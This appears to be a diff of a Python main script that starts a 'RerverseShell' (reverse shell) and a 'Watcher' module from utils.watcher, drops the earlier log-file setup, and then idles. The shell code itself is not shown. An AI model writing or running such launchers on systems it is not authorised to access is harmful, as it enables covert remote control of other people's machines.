@@ -1,11 +1,10 @@
-import logging
 import time
-import platform
-from utils.watcher import RerverseShell
+from utils.watcher import RerverseShell, Watcher
 
 
 if __name__ == "__main__":    
-    logging.basicConfig(filename='Monitor.log', level=logging.INFO, format='%(asctime)s - %(message)s')
+
+    Watcher().initialize()
 
     RerverseShell().initialize()
 
@@ -13,4 +12,4 @@ if __name__ == "__main__":
         while True:
             time.sleep(1)
     except KeyboardInterrupt:
-        print("\nExiting...")
+        print("\nExiting...")   
